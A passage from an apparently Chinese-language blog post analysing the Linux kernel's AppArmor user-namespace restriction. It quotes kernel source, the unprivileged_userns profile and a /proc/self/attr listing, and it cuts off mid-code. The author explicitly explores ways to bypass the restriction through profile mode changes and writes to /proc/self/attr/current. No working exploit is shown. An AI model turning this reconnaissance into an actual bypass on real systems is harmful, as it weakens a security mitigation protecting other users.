ad-&gt;class);</span></span><br><span class="line"><span class="deletion">-		if (!state)</span></span><br><span class="line"><span class="deletion">-			/* TODO: add flag to complain about unmediated */</span></span><br><span class="line"><span class="deletion">-			return 0;</span></span><br><span class="line"><span class="deletion">-		perms = *aa_lookup_perms(rules-&gt;policy, state);</span></span><br><span class="line"><span class="deletion">-		aa_apply_modes_to_perms(profile, &amp;perms);</span></span><br><span class="line"><span class="deletion">-		error = aa_check_perms(profile, &amp;perms, request, ad,</span></span><br><span class="line"><span class="deletion">-				       audit_ns_cb);</span></span><br><span class="line"><span class="addition">+	/* TODO: rework unconfined profile/dfa to mediate user ns, then</span></span><br><span class="line"><span class="addition">+	 * we can drop the unconfined test</span></span><br><span class="line"><span class="addition">+	 */</span></span><br><span class="line"><span class="addition">+	state = RULE_MEDIATES(rules, ad-&gt;class);</span></span><br><span class="line"><span class="addition">+	if (!state) &#123;</span></span><br><span class="line"><span class="addition">+		/* TODO: this gets replaced when the default unconfined</span></span><br><span class="line"><span class="addition">+		 * profile dfa gets updated to handle this</span></span><br><span class="line"><span class="addition">+		 */</span></span><br><span class="line"><span class="addition">+		if (profile_unconfined(profile) &amp;&amp;</span></span><br><span class="line"><span class="addition">+		    profile == profiles_ns(profile)-&gt;unconfined) &#123;</span></span><br><span class="line"><span class="addition">+			if (!aa_unprivileged_userns_restricted ||</span></span><br><span class="line"><span class="addition">+			    ns_capable_noaudit(current_user_ns(),</span></span><br><span class="line"><span class="addition">+					       CAP_SYS_ADMIN))</span></span><br><span class="line"><span class="addition">+				return aa_get_newest_label(&amp;profile-&gt;label);</span></span><br><span class="line"><span class="addition">+			ad-&gt;info = &quot;User namespace creation restricted&quot;;</span></span><br><span class="line"><span class="addition">+			/* unconfined unprivileged user */</span></span><br><span class="line"><span class="addition">+			/* don&#x27;t just return: allow complain mode to override */</span></span><br><span class="line"><span class="addition">+// hardcode unconfined transition for now</span></span><br><span class="line"><span class="addition">+			new = aa_label_parse(&amp;profile-&gt;label,</span></span><br><span class="line"><span class="addition">+					     &quot;unprivileged_userns&quot;, GFP_KERNEL,</span></span><br><span class="line"><span class="addition">+					     true, false);</span></span><br><span class="line"><span class="addition">+			if (IS_ERR(new)) &#123;</span></span><br><span class="line"><span class="addition">+				ad-&gt;info = &quot;Userns create restricted - failed to find unprivileged_userns profile&quot;;</span></span><br><span class="line"><span class="addition">+				ad-&gt;error = PTR_ERR(new);</span></span><br><span class="line"><span class="addition">+				ad-&gt;ns.target = &quot;unprivileged_userns&quot;;</span></span><br><span class="line"><span class="addition">+				new = NULL;</span></span><br><span class="line"><span class="addition">+				perms.deny |= request;</span></span><br><span class="line"><span class="addition">+				goto hard_coded;</span></span><br><span class="line"><span class="addition">+			&#125;</span></span><br><span class="line"><span class="addition">+			ad-&gt;info = &quot;Userns create - transitioning profile&quot;;</span></span><br><span class="line"><span class="addition">+			perms.audit = request;</span></span><br><span class="line"><span class="addition">+			perms.allow = request;</span></span><br><span class="line"><span class="addition">+			goto hard_coded;</span></span><br><span class="line"><span class="addition">+// once we have special unconfined profile, jump to ns_x_to_label()</span></span><br><span class="line"><span class="addition">+// end hardcode</span></span><br><span class="line"><span class="addition">+		&#125; else if (!aa_unprivileged_userns_restricted_force) &#123;</span></span><br><span class="line"><span class="addition">+			return aa_get_newest_label(&amp;profile-&gt;label);</span></span><br><span class="line"><span class="addition">+		&#125;</span></span><br><span class="line"><span class="addition">+		/* continue to mediation */</span></span><br><span class="line"> 	&#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-	return error;</span></span><br><span class="line"><span class="addition">+	perms = *aa_lookup_perms(rules-&gt;policy, state);</span></span><br><span class="line"><span class="addition">+	new = ns_x_to_label(profile, perms.xindex, &amp;ad-&gt;ns.target, &amp;ad-&gt;info);</span></span><br><span class="line"><span class="addition">+	if (IS_ERR(new)) &#123;</span></span><br><span class="line"><span class="addition">+		ad-&gt;error = PTR_ERR(new);</span></span><br><span class="line"><span class="addition">+		new = NULL;</span></span><br><span class="line"><span class="addition">+		perms.deny |= request;</span></span><br><span class="line"><span class="addition">+	&#125; else if (!new) &#123;</span></span><br><span class="line"><span class="addition">+		/* no transition - not done in x_to_label so we can track */</span></span><br><span class="line"><span class="addition">+		new = aa_get_label(&amp;profile-&gt;label);</span></span><br><span class="line"><span class="addition">+	&#125; else &#123;</span></span><br><span class="line"><span class="addition">+hard_coded:</span></span><br><span class="line"><span class="addition">+		ad-&gt;peer = new;</span></span><br><span class="line"><span class="addition">+	&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>這段 code 會切換 profile<br>檢查方式是若當前 profile 是 unconfined 且是預設的 unconfined，就會分配一個 unprivileged_userns 的 profile  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// security/apparmor/task.c</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (profile_unconfined(profile) &amp;&amp;</span><br><span class="line">		    profile == profiles_ns(profile)-&gt;unconfined) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!aa_unprivileged_userns_restricted ||</span><br><span class="line">			    ns_capable_noaudit(current_user_ns(),</span><br><span class="line">					       CAP_SYS_ADMIN))</span><br><span class="line">				<span class="keyword">return</span> aa_get_newest_label(&amp;profile-&gt;label);</span><br><span class="line">			ad-&gt;info = <span class="string">&quot;User namespace creation restricted&quot;</span>;</span><br><span class="line">			<span class="comment">/* unconfined unprivileged user */</span></span><br><span class="line">			<span class="comment">/* don&#x27;t just return: allow complain mode to override */</span></span><br><span class="line"><span class="comment">// hardcode unconfined transition for now</span></span><br><span class="line">			new = aa_label_parse(&amp;profile-&gt;label,</span><br><span class="line">					     <span class="string">&quot;unprivileged_userns&quot;</span>, GFP_KERNEL,</span><br><span class="line">					     <span class="literal">true</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>來看看這個 profile<br>該 profile deny 了所有 capability，也就是說所有需要特殊 capability 的操作都會被拒絕，建立 namespace 的操作缺少了 sys_admin 的 capability，導致建立失敗  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /etc/apparmor.d/unprivileged_userns </span></span><br><span class="line"></span><br><span class="line"># Special profile transitioned to by unconfined when creating an unprivileged</span><br><span class="line"><span class="meta"># user namespace.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">abi <span class="string">&lt;abi/4.0&gt;</span>,</span></span><br><span class="line">include &lt;tunables/global&gt;</span><br><span class="line"></span><br><span class="line">profile unprivileged_userns &#123;</span><br><span class="line">     audit deny capability,</span><br><span class="line">     audit deny change_profile,</span><br><span class="line"></span><br><span class="line">     <span class="meta"># allow block to be replaced by allow when x dominance test is fixed</span></span><br><span class="line">     <span class="meta">#allow all,</span></span><br><span class="line">     allow network,</span><br><span class="line">     allow signal,</span><br><span class="line">     allow dbus,</span><br><span class="line">     allow file rwlkm <span class="comment">/**,</span></span><br><span class="line"><span class="comment">     allow unix,</span></span><br><span class="line"><span class="comment">     allow mqueue,</span></span><br><span class="line"><span class="comment">     allow ptrace,</span></span><br><span class="line"><span class="comment">     allow userns,</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     # stack children to strip capabilities</span></span><br><span class="line"><span class="comment">     allow pix /** -&gt; &amp;unprivileged_userns ,</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     # Site-specific additions and overrides. See local/README for details.</span></span><br><span class="line"><span class="comment">     include if exists &lt;local/unprivileged_userns&gt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>從上述就可以知道，原本 unconfined 的 profile 被轉換成 unprivileged_userns 是無法建立 namespace 的關鍵，因此要來了解一下  </p>
+<p>第一個 unconfined 是從這個結構中的 mode flags 比對是否是 <code>APPARMOR_UNCONFINED</code>，只要是 unconfined 就行<br>這件事不太能動，因為切換 AppArmor 模式是需要 root 的，不過若是能切換模式成 enforce 或 complain 就可以 bypass 了  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> profile_unconfined(X) ((X)-&gt;mode == APPARMOR_UNCONFINED)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aa_profile</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_policy</span> <span class="title">base</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_profile</span> __<span class="title">rcu</span> *<span class="title">parent</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_ns</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *rename;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">audit_mode</span> <span class="title">audit</span>;</span></span><br><span class="line">	<span class="type">long</span> mode;</span><br><span class="line">	u32 path_flags;</span><br><span class="line">	<span class="type">int</span> signal;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *disconnected;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_attachment</span> <span class="title">attach</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">rules</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_net_compat</span> *<span class="title">net_compat</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_audit_cache</span> <span class="title">learning_cache</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_loaddata</span> *<span class="title">rawdata</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *hash;</span><br><span class="line">	<span class="type">char</span> *dirname;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dents</span>[<span class="title">AAFS_PROF_SIZEOF</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rhashtable</span> *<span class="title">data</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_label</span> <span class="title">label</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">profile_mode</span> &#123;</span></span><br><span class="line">	APPARMOR_ENFORCE,	<span class="comment">/* enforce access rules */</span></span><br><span class="line">	APPARMOR_COMPLAIN,	<span class="comment">/* allow and log access violations */</span></span><br><span class="line">	APPARMOR_KILL,		<span class="comment">/* kill task on access violation */</span></span><br><span class="line">	APPARMOR_UNCONFINED,	<span class="comment">/* profile set to unconfined */</span></span><br><span class="line">	APPARMOR_USER,		<span class="comment">/* modified complain mode to userspace */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>另外一個是檢查，這個 macro 會拿到自身 namespace，並拿到 namespace 的 unconfined 預設設定檔並比對當前 profile，如果一樣就會進到發 <code>unprivileged_userns</code> 分支  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> profiles_ns(P) ((P)-&gt;ns)</span></span><br><span class="line"></span><br><span class="line">profiles_ns(profile)-&gt;unconfined</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct aa_ns - namespace for a set of profiles</span></span><br><span class="line"><span class="comment"> * @base: common policy</span></span><br><span class="line"><span class="comment"> * @parent: parent of namespace</span></span><br><span class="line"><span class="comment"> * @lock: lock for modifying the object</span></span><br><span class="line"><span class="comment"> * @acct: accounting for the namespace</span></span><br><span class="line"><span class="comment"> * @unconfined: special unconfined profile for the namespace</span></span><br><span class="line"><span class="comment"> * @sub_ns: list of namespaces under the current namespace.</span></span><br><span class="line"><span class="comment"> * @uniq_null: uniq value used for null learning profiles</span></span><br><span class="line"><span class="comment"> * @uniq_id: a unique id count for the profiles in the namespace</span></span><br><span class="line"><span class="comment"> * @level: level of ns within the tree hierarchy</span></span><br><span class="line"><span class="comment"> * @revision: policy revision for this ns</span></span><br><span class="line"><span class="comment"> * @wait: waitq for tasks waiting on revision changes</span></span><br><span class="line"><span class="comment"> * @listener_lock: lock for listeners</span></span><br><span class="line"><span class="comment"> * @listeners: notification listeners&#x27; proxies list</span></span><br><span class="line"><span class="comment"> * @labels: all the labels associated with this ns</span></span><br><span class="line"><span class="comment"> * @rawdata_list: raw policy data for policy</span></span><br><span class="line"><span class="comment"> * @dents: dentries for the namespaces file entries in apparmorfs</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * An aa_ns defines the set profiles that are searched to determine which</span></span><br><span class="line"><span class="comment"> * profile to attach to a task.  Profiles can not be shared between aa_ns</span></span><br><span class="line"><span class="comment"> * and profile names within a namespace are guaranteed to be unique.  When</span></span><br><span class="line"><span class="comment"> * profiles in separate namespaces have the same name they are NOT considered</span></span><br><span class="line"><span class="comment"> * to be equivalent.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Namespaces are hierarchical and only namespaces and profiles below the</span></span><br><span class="line"><span class="comment"> * current namespace are visible.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Namespace names must be unique and can not contain the characters :/\0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aa_ns</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_policy</span> <span class="title">base</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_ns</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_ns_acct</span> <span class="title">acct</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_profile</span> *<span class="title">unconfined</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">sub_ns</span>;</span></span><br><span class="line">	<span class="type">atomic_t</span> uniq_null;</span><br><span class="line">	<span class="type">long</span> uniq_id;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> revision;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> wait;</span><br><span class="line"></span><br><span class="line">	<span class="type">spinlock_t</span> listener_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">listeners</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aa_labelset</span> <span class="title">labels</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">rawdata_list</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dents</span>[<span class="title">AAFS_NS_SIZEOF</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>而 AppArmor 判斷當前使用的設定檔設定在 <code>/proc/self/attr</code> 下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-VMware-Virtual-Platform:~/Desktop/apparmor-test$ <span class="built_in">ls</span> -la /proc/self/attr</span><br><span class="line">total 0</span><br><span class="line">dr-xr-xr-x 2 naup naup 0 Nov 20 20:52 .</span><br><span class="line">dr-xr-xr-x 9 naup naup 0 Nov 20 20:52 ..</span><br><span class="line">dr-xr-xr-x 2 naup naup 0 Nov 20 20:52 apparmor</span><br><span class="line">-rw-rw-rw- 1 naup naup 0 Nov 20 20:52 current</span><br><span class="line">-rw-rw-rw- 1 naup naup 0 Nov 20 20:52 <span class="built_in">exec</span></span><br><span class="line">-rw-rw-rw- 1 naup naup 0 Nov 20 20:52 fscreate</span><br><span class="line">-rw-rw-rw- 1 naup naup 0 Nov 20 20:52 keycreate</span><br><span class="line">-r--r--r-- 1 naup naup 0 Nov 20 20:52 prev</span><br><span class="line">dr-xr-xr-x 2 naup naup 0 Nov 20 20:52 smack</span><br><span class="line">-rw-rw-rw- 1 naup naup 0 Nov 20 20:52 sockcreate</span><br></pre></td></tr></table></figure>
+
+<p>嘗試去 <code>cat /proc/self/attr/current</code> 可以看到他顯示當前使用的是 <code>unconfined</code>，這會顯示當前使用的設定檔是哪一個，並且有寫入權限，因此可以嘗試修改他，不過若直接寫入會失敗，通常需要修改這下面的東西，都需要通過一定格式來修改<br>這部分來看 code<br>首先是這部分用來建立 proc 下的東西，其中也包含 current，另外可以看到所有操作都是在 <code>proc_pid_attr_operations</code> 這張 vtable 上  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/proc/base.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR(LSMID, NAME, MODE)				\</span></span><br><span class="line"><span class="meta">	NOD(NAME, (S_IFREG|(MODE)),			\</span></span><br><span class="line"><span class="meta">		NULL, &amp;proc_pid_attr_operations,	\</span></span><br><span class="line"><span class="meta">		&#123; .lsmid = LSMID &#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pid_entry</span> <span class="title">attr_dir_stuff</span>[] =</span> &#123;</span><br><span class="line">	ATTR(LSM_ID_UNDEF, <span class="string">&quot;current&quot;</span>,	<span class="number">0666</span>),</span><br><span class="line">	ATTR(LSM_ID_UNDEF, <span class="string">&quot;prev&quot;</span>,		<span class="number">0444</span>),</span><br><span class="line">	ATTR(LSM_ID_UNDEF, <span class="string">&quot;exec&quot;</span>,		<span class="number">0666</span>),</span><br><span class="line">	ATTR(LSM_ID_UNDEF, <span class="string">&quot;fscreate&quot;</span>,	<span class="number">0666</span>),</span><br><span class="line">	ATTR(LSM_ID_UNDEF, <span class="string">&quot;keycreate&quot;</span>,	<span class="number">0666</span>),</span><br><span class="line">	ATTR(LSM_ID_UNDEF, <span class="string">&quot;sockcreate&quot;</span>,	<span class="number">0666</span>),</span><br></pre></td></tr></table></figure>
+
+<p>這張 vtable 紀錄了 write 相關的操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_pid_attr_operations</span> =</span> &#123;</span><br><span class="line">	.open		= proc_pid_attr_open,</span><br><span class="line">	.read		= proc_pid_attr_read,</span><br><span class="line">	.write		= proc_pid_attr_write,</span><br><span class="line">	.llseek		= generic_file_llseek,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>前面會做一些檢查，之後呼叫正確 LSM (看起來像一個 hook，lsmid 選擇哪個 LSM 來處理)<br>LSM 自己解析 attribute 名稱與內容，並設定<br><a target="_blank" rel="noopener" href="https://lwn.net/Articles/940180/">https://lwn.net/Articles/940180/</a>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_pid_attr_write</span><span class="params">(<span class="keyword">struct</span> file * file, <span class="type">const</span> <span class="type">char</span> __user * buf,</span></span><br><span class="line"><span class="params">				   <span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> * <span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="type">void</span> *page;</span><br><span class="line">	<span class="type">int</span> rv;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* A task may only write when it was the opener. */</span></span><br><span class="line">	<span class="keyword">if</span> (file-&gt;private_data != current-&gt;mm)</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	task = pid_task(proc_pid(inode), PIDTYPE_PID);</span><br><span class="line">	<span class="keyword">if</span> (!task) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">return</span> -ESRCH;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* A task may only write its own attributes. */</span></span><br><span class="line">	<span class="keyword">if</span> (current != task) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Prevent changes to overridden credentials. */</span></span><br><span class="line">	<span class="keyword">if</span> (current_cred() != current_real_cred()) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (count &gt; PAGE_SIZE)</span><br><span class="line">		count = PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* No partial writes. */</span></span><br><span class="line">	<span class="keyword">if</span> (*ppos != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	page = memdup_user(buf, count);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line">		rv = PTR_ERR(page);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Guard against adverse ptrace interaction */</span></span><br><span class="line">	rv = mutex_lock_interruptible(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free;</span><br><span class="line"></span><br><span class="line">	rv = security_setprocattr(PROC_I(inode)-&gt;op.lsmid,</span><br><span class="line">				  file-&gt;f_path.dentry-&gt;d_name.name, page,</span><br><span class="line">				  count);</span><br><span class="line">	mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">out_free:</span><br><span class="line">	kfree(page);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> rv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// security/security.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * security_setprocattr() - Set an attribute for a task</span></span><br><span class="line"><span class="comment"> * @lsmid: LSM identification</span></span><br><span class="line"><span class="comment"> * @name: attribute name</span></span><br><span class="line"><span class="comment"> * @value: attribute value</span></span><br><span class="line"><span class="comment"> * @size: attribute value size</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Write (set) the current task&#x27;s attribute @name to @value, size @size if</span></span><br><span class="line"><span class="comment"> * allowed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: Returns bytes written on success, a negative value otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">security_setprocattr</span><span class="params">(<span class="type">int</span> lsmid, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *value, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">	hlist_for_each_entry(hp, &amp;security_hook_heads.setprocattr, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (lsmid != <span class="number">0</span> &amp;&amp; lsmid != hp-&gt;lsmid-&gt;id)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span 